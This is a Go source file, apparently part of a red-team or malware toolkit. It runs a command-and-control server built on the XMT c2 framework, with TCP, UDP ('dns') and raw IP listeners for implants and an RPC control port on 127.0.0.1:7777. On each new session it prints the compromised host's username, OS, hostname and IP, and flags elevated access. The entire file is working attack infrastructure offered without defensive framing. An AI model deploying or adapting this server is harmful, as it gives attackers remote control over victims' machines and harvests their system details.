package main

import (
	"encoding/json"

	"github.com/PurpleSec/logx"
	"github.com/iDigitalFlame/xmt/c2"
	"github.com/iDigitalFlame/xmt/c2/rpc"
	"github.com/iDigitalFlame/xmt/com"
)

var configTCP, configIP, configUDP []byte

func main() {
	f, err := logx.File("/tmp/thunderstorm.log", logx.Append, logx.Debug)
	if err != nil {
		panic(err)
	}
	c2.Default.Log = logx.Multiple(f, logx.Console(logx.Debug))

	if err := startTCPListener("tcp-alt", ""); err != nil {
		panic("tcp-alt listen " + err.Error())
	}
	if err := startTCPListener("tcp", ""); err != nil {
		panic("tcp listen " + err.Error())
	}
	if err := startUDPListener("dns", ""); err != nil {
		panic("udp listen " + err.Error())
	}
	if err := startIPListener("ip", ""); err != nil {
		panic("ip listen " + err.Error())
	}

	r := rpc.New(c2.Default)
	go r.Listen("127.0.0.1:7777")

	c2.Default.Wait()
	r.Close()
	c2.Default.Close()
}

func newSession(s *c2.Session) {
	var v string
	for _, n := range s.Device.Network {
		for _, a := range n.Address {
			if a.IsZero() || a.IsLinkLocalUnicast() || a.IsLoopback() {
				continue
			}
			v = a.String()
			break
		}
	}
	d := map[string]string{
		"username":  s.Device.User,
		"os":        s.Device.Version,
		"hostname":  s.Device.Hostname,
		"ipaddress": v,
	}
	if s.Device.Elevated {
		d["username"] = "*" + d["username"]
	}
	b, _ := json.Marshal(d)
	println(string(b))
}
func startIPListener(s, a string) error {
	var c c2.Config
	if err := c.ReadBytes(configIP); err != nil {
		return err
	}
	p, err := c.Profile()
	if err != nil {
		return err
	}
	l, err := c2.Default.Listen(s, a, com.NewIP(1, com.DefaultTimeout), p)
	if err != nil {
		return err
	}
	l.New = newSession
	return nil
}
func startTCPListener(s, a string) error {
	var c c2.Config
	if err := c.ReadBytes(configTCP); err != nil {
		return err
	}
	p, err := c.Profile()
	if err != nil {
		return err
	}
	l, err := c2.Default.Listen(s, a, com.TCP, p)
	if err != nil {
		return err
	}
	l.New = newSession
	return nil
}
func startUDPListener(s, a string) error {
	var c c2.Config
	if err := c.ReadBytes(configUDP); err != nil {
		return err
	}
	p, err := c.Profile()
	if err != nil {
		return err
	}
	l, err := c2.Default.Listen(s, a, com.UDP, p)
	if err != nil {
		return err
	}
	l.New = newSession
	return nil
}
